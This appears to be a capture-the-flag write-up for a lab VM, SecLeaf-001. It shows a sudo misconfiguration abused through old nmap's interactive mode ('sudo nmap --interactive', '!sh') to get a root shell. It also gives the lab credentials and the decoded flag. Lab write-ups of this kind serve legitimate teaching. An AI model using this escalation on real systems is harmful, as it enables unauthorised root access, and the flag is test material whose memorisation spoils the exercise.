# TL Priv Esc #1 (SecLeaf-001)

Fired up the VM `SecLeaf-001.ova` and logged in with the provided credentials `osint` : `TLosint`.

First thing on any Linux box — check sudo rights:
```bash
osint@secleaf:~$ sudo -l
User osint may run the following commands on secleaf:
    (root) /usr/bin/nmap
```

Classic GTFOBins vector. Checked nmap version and it was old enough (v3.81) to still have interactive mode enabled (`--interactive`). Ran it under sudo and popped a shell:

```bash
osint@secleaf:~$ sudo nmap --interactive
nmap> !sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

Instant root shell. Looked around `/root` for the flag:
```bash
# find /root -type f
/root/root/.../flag.txt
/root/osint/files/flag.txt

# cat /root/osint/files/flag.txt
The flag format is SecLeaf{}

# cat /root/root/.../flag.txt
bG9jYWxfZXNjbDR0M19yMDB0
```

Decoded the base64 string:
```bash
# echo -n "bG9jYWxfZXNjbDR0M19yMDB0" | base64 -d
local_escl4t3_r00t
```

Flag:
```text
SecLeaf{local_escl4t3_r00t}
```
